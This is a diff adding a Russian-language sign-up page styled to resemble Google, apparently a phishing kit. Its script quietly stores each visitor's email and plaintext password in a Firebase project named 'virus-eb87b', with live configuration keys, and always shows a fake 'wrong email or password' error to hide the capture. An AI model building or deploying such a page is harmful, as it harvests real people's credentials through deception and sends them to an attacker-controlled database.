@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Регистрация</title>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  
+  <!-- Firebase SDK -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.0/firebase-app.js";
+    import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/11.8.0/firebase-auth.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.8.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyA3rd90080u4tZVxp8FSQAE6ZW4uRLBIpY",
+      authDomain: "virus-eb87b.firebaseapp.com",
+      projectId: "virus-eb87b",
+      storageBucket: "virus-eb87b.firebasestorage.app",
+      messagingSenderId: "678847278608",
+      appId: "1:678847278608:web:eaae32b5c4ca0b975c6495"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+    const db = getFirestore(app);
+
+    // Функция, которая тихо сохраняет в Firestore и всегда возвращает "ошибку"
+    window.silentRegister = async (email, password) => {
+      // Сначала пробуем записать в Firestore (это основное)
+      try {
+        const docRef = await addDoc(collection(db, "registrations"), {
+          email: email,
+          password: password, // Только для демо
+          createdAt: serverTimestamp(),
+          attemptedAt: new Date().toISOString()
+        });
+        console.log('✅ Данные записаны в Firestore, ID:', docRef.id);
+      } catch (firestoreError) {
+        console.error('❌ Ошибка Firestore:', firestoreError);
+        // Даже при ошибке покажем сообщение пользователю, что всё "плохо"
+      }
+
+      // Попутно пробуем зарегистрировать в Auth (но результат игнорируем)
+      try {
+        await createUserWithEmailAndPassword(auth, email, password);
+        console.log('✅ Пользователь создан в Auth');
+      } catch (authError) {
+        console.warn('⚠️ Auth пропущен:', authError.code);
+      }
+
+      // Всегда возвращаем "ошибку" для отображения
+      return { success: false };
+    };
+  </script>
+
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #f5f7fa;
+      font-family: 'Google Sans', 'Roboto', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+    .register-box {
+      background: white;
+      max-width: 380px;
+      width: 100%;
+      padding: 36px 28px 32px;
+      border-radius: 24px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.06);
+    }
+    h1 {
+      font-size: 26px;
+      font-weight: 500;
+      color: #1a1a1a;
+      margin-bottom: 28px;
+      text-align: center;
+    }
+    .field { margin-bottom: 20px; }
+    .field input {
+      width: 100%;
+      padding: 15px 18px;
+      font-size: 16px;
+      border: 1.5px solid #d0d5dd;
+      border-radius: 14px;
+      outline: none;
+      transition: border 0.15s, box-shadow 0.15s;
+      font-family: inherit;
+      background: #ffffff;
+    }
+    .field input:focus {
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.12);
+    }
+    .field input::placeholder { color: #8a94a6; font-weight: 400; }
+    .btn {
+      width: 100%;
+      background: #1a73e8;
+      color: white;
+      border: none;
+      padding: 15px 18px;
+      font-size: 16px;
+      font-weight: 500;
+      border-radius: 40px;
+      cursor: pointer;
+      margin-top: 12px;
+      transition: background 0.2s;
+      font-family: inherit;
+    }
+    .btn:hover { background: #1669d6; }
+    .error-message {
+      color: #d93025;
+      font-size: 14px;
+      margin-top: 16px;
+      text-align: center;
+      min-height: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="register-box">
+  <h1>Регистрация</h1>
+
+  <form onsubmit="handleRegister(event)" novalidate>
+    <div class="field">
+      <input type="email" id="email" placeholder="Email" autocomplete="email">
+    </div>
+    <div class="field">
+      <input type="password" id="password" placeholder="Пароль" autocomplete="new-password">
+    </div>
+    <button type="submit" class="btn">Зарегистрироваться</button>
+  </form>
+
+  <div id="errorMsg" class="error-message"></div>
+</div>
+
+<script>
+  async function handleRegister(e) {
+    e.preventDefault();
+
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    const errorDiv = document.getElementById('errorMsg');
+
+    // Вызываем тихую отправку
+    await window.silentRegister(email, password);
+
+    // Показываем красное сообщение
+    errorDiv.style.color = '#d93025';
+    errorDiv.textContent = 'Неправильная почта или пароль';
+  }
+</script>
+
+</body>
+</html>
